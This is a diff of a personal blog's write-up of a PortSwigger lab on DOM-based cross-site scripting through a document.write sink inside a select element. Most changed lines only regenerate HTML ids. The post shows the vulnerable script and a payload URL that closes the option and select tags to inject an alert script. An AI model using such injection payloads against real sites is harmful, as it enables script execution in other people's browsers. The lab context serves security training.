@@ -19,23 +19,23 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgd6047c1">Introduction</a></li>
-<li><a href="#orgc951f58">Challenge</a></li>
-<li><a href="#org6400e49">Summary</a></li>
+<li><a href="#org1942dc1">Introduction</a></li>
+<li><a href="#orgd842828">Challenge</a></li>
+<li><a href="#orgc713adc">Summary</a></li>
 </ul>
 </div>
 </div>
-<div id="outline-container-orgd6047c1" class="outline-2">
-<h2 id="orgd6047c1"><a href="#orgd6047c1">Introduction</a></h2>
-<div class="outline-text-2" id="text-orgd6047c1">
+<div id="outline-container-org1942dc1" class="outline-2">
+<h2 id="org1942dc1"><a href="#org1942dc1">Introduction</a></h2>
+<div class="outline-text-2" id="text-org1942dc1">
 <p>
 Not much to say here, just glad to have found some time for challenges ;P
 </p>
 </div>
 </div>
-<div id="outline-container-orgc951f58" class="outline-2">
-<h2 id="orgc951f58"><a href="#orgc951f58">Challenge</a></h2>
-<div class="outline-text-2" id="text-orgc951f58">
+<div id="outline-container-orgd842828" class="outline-2">
+<h2 id="orgd842828"><a href="#orgd842828">Challenge</a></h2>
+<div class="outline-text-2" id="text-orgd842828">
 <p>
 You can check the lab out: <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element">here</a>
 </p>
@@ -52,7 +52,7 @@ after previewing the source code, is handled by the following
 javascript snippet:
 </p>
 <div class="org-src-container">
-<pre class="src src-javascript" id="org2343d20"><span class="org-keyword">var</span> <span class="org-variable-name">stores</span> = [<span class="org-string">"London"</span>,<span class="org-string">"Paris"</span>,<span class="org-string">"Milan"</span>];
+<pre class="src src-javascript" id="org1f03e42"><span class="org-keyword">var</span> <span class="org-variable-name">stores</span> = [<span class="org-string">"London"</span>,<span class="org-string">"Paris"</span>,<span class="org-string">"Milan"</span>];
 <span class="org-keyword">var</span> <span class="org-variable-name">store</span> = (<span class="org-keyword">new</span> <span class="org-type">URLSearchParams</span>(window.location.search)).get(<span class="org-string">'storeId'</span>);
 document.write(<span class="org-string">'&lt;select name="storeId"&gt;'</span>);
 <span class="org-keyword">if</span>(store) {
@@ -71,14 +71,14 @@ document.write(<span class="org-string">'&lt;/select&gt;'</span>);
 <p>
 In our request we can see that, the variables can be modified:
 </p>
-<pre class="example" id="orga8bc27f">
+<pre class="example" id="orgb734f55">
 productId=1&amp;storeId=London
 </pre>
 
 <p>
 Sample link that gives us the desired output in console:
 </p>
-<pre class="example" id="org0428a5d">
+<pre class="example" id="org8dcbbad">
 https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?productId=1&amp;storeId=asdfasdf
 </pre>
 
@@ -86,14 +86,14 @@ https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?produc
 After that it was tedious: We just had to get out of the existing
 environments and add a script one:
 </p>
-<pre class="example" id="org26c907b">
+<pre class="example" id="org56e4585">
 https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?productId=1&amp;storeId=&lt;/option&gt;&lt;/select&gt;&lt;script&gt;alert(1)&lt;/script&gt;
 </pre>
 </div>
 </div>
-<div id="outline-container-org6400e49" class="outline-2">
-<h2 id="org6400e49"><a href="#org6400e49">Summary</a></h2>
-<div class="outline-text-2" id="text-org6400e49">
+<div id="outline-container-orgc713adc" class="outline-2">
+<h2 id="orgc713adc"><a href="#orgc713adc">Summary</a></h2>
+<div class="outline-text-2" id="text-orgc713adc">
 <p>
 This was the first challenge I completed for the day, and I think it
 was the perfect way to start it: not too easy, but at the same time
@@ -118,7 +118,7 @@ Not really necessary, knowing that we check for DOM XSS but all is fine.
 </div>
 </div></div>
 <div id="postamble" class="status">
-<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2024-02-27 Tue 10:07</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.<br> <a href="https://github.com/chatziiola"> <i class="fa-brands fa-github"></i> </a> <a href="https://www.linkedin.com/in/chatziiola"> <i class="fa-brands fa-linkedin"></i> </a> </p>
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2024-02-27 Tue 10:07</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.<br> <a href="https://github.com/chatziiola"> <i class="fa-brands fa-github"></i> </a> <a href="https://www.linkedin.com/in/chatziiola"> <i class="fa-brands fa-linkedin"></i> </a> <a href="/posts/rss.xml"> <i class="fa-solid fa-rss"></i> </a> </p>
 </div>
 </body>
 </html>
